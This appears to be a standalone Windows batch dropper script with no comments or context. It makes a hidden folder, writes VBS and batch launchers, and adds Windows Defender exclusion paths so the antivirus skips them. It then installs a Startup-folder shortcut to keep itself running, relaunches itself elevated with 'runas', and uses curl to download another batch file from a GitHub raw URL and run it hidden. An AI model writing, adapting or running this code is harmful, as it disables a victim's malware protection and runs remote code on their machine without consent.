%homedrive%
rmdir /s /q %homedrive%\Amuka
mkdir %homedrive%\Amuka
attrib +h %homedrive%\Amuka
cd %homedrive%\Amuka
echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Amuka\Akuma.vbs
echo objShell.Run "%homedrive%\Amuka\Akuma.bat", 0, False >> %homedrive%\Amuka\Akuma.vbs
echo cd %~dp0 >> %homedrive%\Amuka\Amuka.bat
powershell Add-MpPreference -ExclusionPath "$env:homedrive\Akuma" >> %homedrive%\Amuka\Amuka.bat
powershell Add-MpPreference -ExclusionPath "$env:homedrive\Amuka" >> %homedrive%\Amuka\Amuka.bat
echo powershell Add-MpPreference -ExclusionPath "$env:homedrive\Amuka" >> %homedrive%\Amuka\Amuka.bat
echo curl -O https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat >> %homedrive%\Amuka\Amuka.bat
echo start %homedrive%\Amuka\Akuma.vbs >> %homedrive%\Amuka\Amuka.bat
echo del "%userprofile%\Start Menu\Programs\Startup\Amuka.lnk" >> %homedrive%\Amuka\Amuka.bat
echo rmdir /s /q %homedrive%\Amuka >> %homedrive%\Amuka\Amuka.bat
echo Set app = CreateObject("Shell.Application") >> %homedrive%\Amuka\Amuka.vbs
echo app.ShellExecute "%homedrive%\Amuka\Amuka.bat", , , "runas", 3 >> %homedrive%\Amuka\Amuka.vbs
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Amuka.lnk');$s.TargetPath='%homedrive%\Amuka\Amuka.vbs';$s.Save()"
start %homedrive%\Amuka\Amuka.vbs
curl -O https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat
start %homedrive%\Amuka\Akuma.vbs
